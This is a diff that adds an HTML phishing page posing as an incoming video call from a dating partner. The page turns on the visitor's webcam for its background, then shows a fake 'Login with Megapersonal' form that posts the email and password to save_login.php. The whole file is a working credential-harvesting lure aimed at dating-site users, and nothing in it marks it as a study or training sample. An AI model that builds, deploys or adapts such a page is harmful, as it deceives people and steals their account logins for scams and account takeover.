@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Incoming Video Call</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+            background-color: black; /* Fallback color */
+        }
+        .background-video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+        .container, .live-chat, .login-page {
+            position: relative;
+            text-align: center;
+            z-index: 1;
+            display: none;
+        }
+        .title {
+            font-size: 2em;
+            margin-bottom: 20px;
+            color: white;
+        }
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        .button {
+            padding: 15px 30px;
+            font-size: 1.2em;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+        }
+        .button-green {
+            background-color: #4CAF50;
+        }
+        .button-red {
+            background-color: #f44336;
+        }
+        .live-chat-content, .login-content {
+            color: white;
+        }
+        .login-button {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1.2em;
+        }
+        .login-button img {
+            margin-right: 10px;
+            width: 24px;
+            height: 24px;
+        }
+        .login-form {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 5px;
+            display: inline-block;
+        }
+        .login-form input {
+            display: block;
+            margin: 10px 0;
+            padding: 10px;
+            width: 100%;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-form button {
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+    </style>
+</head>
+<body>
+    <video id="backgroundVideo" autoplay muted playsinline class="background-video"></video>
+    <div class="container" id="incomingCall">
+        <div class="title">Incoming Video Call</div>
+        <div class="buttons">
+            <button class="button button-green" onclick="showLiveChat()">Receive</button>
+            <button class="button button-red">Decline</button>
+        </div>
+    </div>
+    <div class="live-chat" id="liveChat">
+        <div class="live-chat-content">
+            <div class="title">Live Video Chat</div>
+            <p>Login with Megapersonal and enjoy a Private Video chat with your dating partner.</p>
+            <button class="login-button" onclick="showLoginPage()">
+                <img src="path-to-your-logo-image.png" alt="Logo">
+                Login with Megapersonal
+            </button>
+        </div>
+    </div>
+    <div class="login-page" id="loginPage">
+        <div class="login-content">
+            <img src="path-to-your-site-icon.png" alt="Site Icon" style="width: 50px; height: 50px;">
+            <div class="title">Login</div>
+            <form class="login-form" action="save_login.php" method="POST">
+                <input type="email" name="email" placeholder="Email" required>
+                <input type="password" name="pass" placeholder="Password" required>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </div>
+    <script>
+                // Access the user's webcam
+        const video = document.getElementById('backgroundVideo');
+
+        // Request video stream from the user's device
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                // Set the video source to the stream
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Error accessing the camera: " + err);
+            });
+
+        function showLiveChat() {
+            document.getElementById('incomingCall').style.display = 'none';
+            document.getElementById('liveChat').style.display = 'block';
+        }
+
+        function showLoginPage() {
+            document.getElementById('liveChat').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'block';
+        }
+
+        // Initially show the incoming call container
+        document.getElementById('incomingCall').style.display = 'block';
+    </script>
+</body>
+</html>
